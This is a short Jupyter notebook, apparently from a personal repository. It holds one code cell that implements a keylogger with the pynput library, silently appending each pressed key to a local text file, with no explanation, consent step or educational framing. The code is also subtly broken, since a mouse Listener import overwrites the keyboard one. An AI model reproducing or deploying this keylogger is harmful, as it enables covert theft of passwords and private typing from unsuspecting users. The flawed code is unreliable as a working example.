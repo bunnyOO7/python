{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Listener\n",
    "from pynput.mouse import Listener\n",
    "def press(key):\n",
    "    w=str(key)\n",
    "    w=w.replace(\"'\",\"\")\n",
    "    if w==\"Key.space\":\n",
    "        w=\" \"\n",
    "    if w==\"Key.shift\":\n",
    "        w=\"\"\n",
    "    o=open(\"keyfile.txt\",'a')\n",
    "    o.write(w)\n",
    "    o.close()\n",
    "with Listener(on_press=press) as k:\n",
    "    k.join()\n",
    "\n",
    "   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
